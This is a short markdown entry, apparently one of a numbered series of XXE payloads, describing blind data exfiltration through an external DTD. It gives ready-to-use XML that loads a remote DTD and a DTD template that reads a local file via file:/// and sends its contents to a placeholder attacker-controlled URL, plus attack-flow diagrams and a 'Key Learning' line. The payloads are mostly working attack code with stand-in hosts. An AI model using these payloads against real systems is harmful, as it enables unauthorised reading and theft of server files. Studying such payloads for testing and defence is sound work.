# Payload 05 – External DTD Data Exfiltration

## Purpose

Use an external DTD as part of a blind XXE data-exfiltration technique.

---

## Main XML

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "YOUR-DTD-URL">
    %xxe;
]>
<foo>
    test
</foo>
```

---

## External DTD Concept

The externally hosted DTD can define entities that reference a local resource and cause an outbound interaction.

Conceptual structure:

```text
External DTD
     ↓
Read Local Resource
     ↓
Construct External Request
     ↓
Controlled Server
```

---

## Generic DTD Structure

```xml
<!ENTITY % file SYSTEM "file:///PATH/TO/FILE">

<!ENTITY % eval
"<!ENTITY &#x25; exfil SYSTEM 'YOUR-CONTROLLED-URL/?data=%file;'>">

%eval;
%exfil;
```

---

## Attack Flow

```text
Attacker
   ↓
XML
   ↓
External DTD
   ↓
Parameter Entity
   ↓
Local Resource
   ↓
Outbound Request
   ↓
Controlled Server
```

---

## Important

The exact syntax and behavior depend on the XML parser and target environment.

---

## Verification

Monitor the controlled server for the resulting interaction.

---

## Key Learning

External DTDs can provide more flexibility than declarations contained entirely inside the original XML document.